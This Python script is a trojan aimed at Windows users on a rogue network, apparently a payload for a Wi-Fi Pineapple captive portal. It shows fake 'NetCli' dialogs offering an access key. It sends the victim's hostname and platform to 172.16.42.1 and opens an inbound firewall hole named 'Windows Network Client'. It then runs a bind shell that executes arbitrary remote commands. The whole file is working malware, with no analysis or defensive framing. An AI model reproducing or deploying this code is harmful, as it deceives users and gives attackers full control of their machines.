import ctypes
import time
import socket,subprocess
from random import randint
import platform
import threading
import sys

rhost = '172.16.42.1'
rport = 4443

MessageBox = ctypes.windll.user32.MessageBoxA
firewallRule = 'netsh advfirewall firewall add rule name="Windows Network Client" protocol=TCP dir=in localport=xxxxx action=allow'

def execShellCmd(sock, cmd):
	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
	stdout_value = proc.stdout.read() + proc.stderr.read()
	sock.sendall(stdout_value)

MessageBox(0, "Thank you for using NetCli provided by Public Network Solutions!\n\nTo get started please click 'OK' below and we will reach out to our authentication servers to get you an access key.", "NetCli Connection Manager", 0)

# Create a listener for the new shell and a socket to connect back
# to the Pineapple to send information about the new listener.
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
c_bk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect back to the Pineapple
# If the connection fails don't show the user the access key, instead present an error
# that informs them they must run the NetworkClient again.
try:
	c_bk.connect((rhost,rport))
except socket.error as sockerr:
	MessageBox(0, "The following error occurred when attempting to fetch your access key:\n\n" + str(sockerr) + "\n\nPlease try again later", "Connection Error", 0)
	sys.exit()

# Pick a random port number on which to listen
bound = False
while bound == False:
	lport = randint(30000, 65534)
	try:
		listener.bind((socket.gethostbyname(socket.gethostname()), lport))
		bound = True
	except:
		bound = False
		continue

# Add a firewall rule to Windows Firewall that allows inbound connections on the port
try:
	firewallRule = firewallRule.replace('xxxxx', str(lport))
	ret = subprocess.call(firewallRule, shell=True)
except:
	MessageBox(0,"Our automatic configuration attempt of the firewall failed.  Please allow NetCli through the firewall if you are prompted.","NetCli Auto Configuration Failed",0)

# Send the port number of the new listener back to the Pineapple along with other system information
sysinfo = ";".join([str(lport), socket.gethostname(), platform.platform()])
c_bk.send(sysinfo)

# Wait to receive the access key
accessKey = c_bk.recv(1024)

# Close the connection back to the Pineapple
c_bk.close()

# Display a message box to the victim with their access key
MessageBox(0, "Please use the following key to access the network:\n\n" + accessKey, "Access Key", 0)

listener.listen(5)
threads = []
connected = False
while 1:
	if not connected:
		(client, address) = listener.accept()
		connected = True
	while 1:
		try:
			cmd = client.recv(4096)
			shellThread = threading.Thread(target=execShellCmd, args=(client,cmd))
			threads.append(shellThread)
			shellThread.start()
			
			if not len(cmd):
				connected = False
				break
		except:
			connected = False
			break

listener.close()